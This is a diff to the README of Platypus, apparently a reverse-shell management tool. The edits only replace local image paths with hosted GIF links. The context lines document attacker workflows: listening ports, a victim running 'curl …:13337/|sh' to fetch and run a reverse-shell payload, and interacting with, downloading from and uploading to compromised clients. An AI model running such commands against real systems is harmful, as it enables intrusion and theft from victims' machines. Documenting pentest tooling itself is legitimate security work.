@@ -101,7 +101,7 @@ restful:
 update: false
 ```
 
-![](./docs/zh/docs/images/cli/start.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/start.gif)
 
 As you can see, platypus will check for updates, then start listening on port 13337, 13338 and 7331
 
@@ -123,7 +123,7 @@ curl http://192.168.88.129:13337/|sh
 
 Now, suppose that the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.
 
-![](./docs/zh/docs/images/cli/connect.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/connect.gif)
 
 > Notice, the RaaS feature ensure that the reverse shell process is running in background and ignore the hangup signal.
 
@@ -131,19 +131,19 @@ Now, suppose that the victim is attacked by the attacker and a reverse shell com
 
 ### Manage listening port
 
-![](./docs/zh/docs/images/webui/add.gif)
+![](https://platypus-reverse-shell.vercel.app/images/webui/add.gif)
 
 ### Wait for client connection
 
-![](./docs/zh/docs/images/webui/wait.gif)
+![](https://platypus-reverse-shell.vercel.app/images/webui/wait.gif)
 
 ### Popup an interactive shell
 
-![](./docs/zh/docs/images/webui/shell.gif)
+![](https://platypus-reverse-shell.vercel.app/images/webui/shell.gif)
 
 ### Upgrade a reverse shell to an encrypted channel (Termite)
 
-![](./docs/zh/docs/images/webui/upgrade.gif)
+![](https://platypus-reverse-shell.vercel.app/images/webui/upgrade.gif)
 
 ## Get start with cli
 
@@ -151,7 +151,7 @@ Now, suppose that the victim is attacked by the attacker and a reverse shell com
 
 You can use `List` command to print table style infomation about all listening servers and connected clients. Notice that the port `13337` will reset the connection from the same machine (we consider two connection are same iff they share the same Hash value, the info being hash can be configured in `config.yml`). Port `13338` will not reset such connections, which provide more repliability.
 
-![](./docs/zh/docs/images/cli/list.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/list.gif)
 
 ### Select a victim
 
@@ -161,26 +161,26 @@ Also, for jumping through `HASH`, you do not need to type the whole hash, just p
 
 > All commands are case insensitive, feel free to use tab for completing.
 
-![](./docs/zh/docs/images/cli/jump.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/jump.gif)
 
 
 ### Interactive shell
 
 `Interact` will popup a shell, just like `netcat`.
 
-![](./docs/zh/docs/images/cli/interact.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/interact.gif)
 
 ### Download file
 
 Use `Download` command to download file from reverse shell client to attacker's machine.
 
-![](./docs/zh/docs/images/cli/download.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/download.gif)
 
 ### Upload file
 
 Use `Upload` command to upload file to the current interacting client.
 
-![](./docs/zh/docs/images/cli/upload.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/upload.gif)
 
 ### Interactive shell mode
 
@@ -192,7 +192,7 @@ Try to Spawn `/bin/bash` via Python, then the shell is fully interactive (You ca
 First use `Jump` to select a client, then type `PTY`, then type `Interact` to drop into a fully interactive shell.
 ~~You can just simply type `exit` to exit pty mode~~, to avoid the situation in [issue #39](https://github.com/WangYihang/Platypus/issues/39), you can use `platyquit` to quit the fully interactive shell mode.
 
-![](./docs/zh/docs/images/cli/interactive.gif)
+![](https://platypus-reverse-shell.vercel.app/images/cli/interactive.gif)
 
 
 ## Advanced [Usages](./doc)
